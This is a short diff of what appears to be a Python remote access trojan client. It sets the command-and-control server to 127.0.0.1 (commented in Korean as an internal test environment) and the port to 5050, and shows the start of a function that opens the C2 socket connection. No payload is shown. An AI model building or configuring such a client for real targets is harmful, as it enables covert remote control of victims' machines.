@@ -5,8 +5,8 @@ import subprocess
 SIGNATURE = "RAT_CLIENT"
 
 # C2 서버 설정
-C2_SERVER = ""
-C2_PORT = 
+C2_SERVER = "127.0.0.1"  # 내부 테스트 환경
+C2_PORT = 5050
 
 def connect_to_c2():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
